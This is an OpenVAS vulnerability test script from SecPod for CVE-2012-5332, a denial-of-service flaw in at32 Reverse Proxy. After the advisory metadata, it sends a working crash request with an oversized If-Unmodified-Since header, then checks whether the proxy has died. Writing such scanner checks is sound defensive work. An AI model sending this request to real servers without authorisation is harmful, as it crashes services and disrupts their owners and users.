###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_at32_reverse_proxy_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# at32 Reverse Proxy Multiple HTTP Header Fields Denial Of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial of service condition.
  Impact Level: Application";
tag_affected = "at32 Reverse Proxy version 1.060.310";
tag_insight = "The flaw is due to a NULL pointer dereference error when processing
  web requests and can be exploited to cause a crash via an overly long string
  within a HTTP header.";
tag_solution = "No solution or patch is available as of 29th March, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.at32.com/doc/rproxy.htm";
tag_summary = "This host is running at32 Reverse Proxy and is prone to denial of
  service vulnerability.";

if(description)
{
  script_id(902825);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-5332");
  script_bugtraq_id(52553);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-29 12:12:12 +0530 (Thu, 29 Mar 2012)");
  script_name("at32 Reverse Proxy Multiple HTTP Header Fields Denial Of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/80242");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48460");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52553");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521993");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/110967/at32-dos.txt");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2012-03/0080.html");

  script_description(desc);
  script_summary("Check if at32 Reverse Proxy is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Variable Initialization
req = "";
res = "";
port = 0;

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Send and Receive the response
req = http_get(item:"/", port:port);
res = http_send_recv(port:port, data:req);

## Confirm the application before trying exploit
if(res && "reverse proxy" >< tolower(res))
{
  ## Construct attack request
  req = string("GET / HTTP/1.0\r\n",
               "If-Unmodified-Since: ", crap(10000), "\r\n",
               "Connection: Keep-Alive\r\n\r\n");

  ## Send crafted request
  for(i=0; i<3; i++){
    res = http_send_recv(port:port, data:req);
  }
  sleep(3);

  ## Confirm Proxy Server is dead
  if(http_is_dead(port:port)){
    security_warning(port);
  }
}
